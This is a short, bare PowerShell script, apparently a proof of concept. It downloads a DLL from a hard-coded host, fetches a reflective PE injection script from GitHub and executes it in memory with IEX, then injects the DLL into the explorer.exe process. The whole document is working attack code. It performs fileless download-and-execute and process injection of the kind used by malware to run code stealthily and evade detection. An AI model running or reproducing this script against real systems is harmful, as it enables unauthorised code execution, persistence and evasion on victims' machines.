$bytes = (New-Object System.Net.WebClient).DownloadData('http://172.16.62.228:8080/calc.dll')
$procid = (Get-Process -Name explorer).Id
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dismantl/Invoke-ReflectivePEInjection/main/Invoke-ReflectivePEInjection.ps1')
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid